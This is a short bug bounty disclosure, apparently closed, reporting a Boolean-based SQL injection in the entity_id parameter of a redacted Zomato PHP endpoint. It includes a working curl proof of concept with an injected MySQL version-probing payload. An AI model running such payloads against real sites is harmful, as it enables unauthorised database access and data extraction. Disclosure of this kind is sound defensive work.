WeaknessName:SQL Injection

Severity:
State:Closed

Summary:
@gerben_javado found that the parameter entity_id was vulnerable to SQLi on endpoint /████.php using a Boolean technique.

##POC

The POC uses `if(mid(@@version,1,1)=5` which returns a 200 ok message. If changed for `if(mid(@@version,1,1)=4` the server gives a 500 or 504 error, confirming the SQLi and proving data extraction.

```
curl -H 'Host: www.zomato.com' -H 'Cookie: PHPSESSID=XXXXX' 'https://www.zomato.com/████.php?entity_type=restaurant&entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23' -k
```

Thanks @gerben_javado for helping us in keeping @zomato secure :)
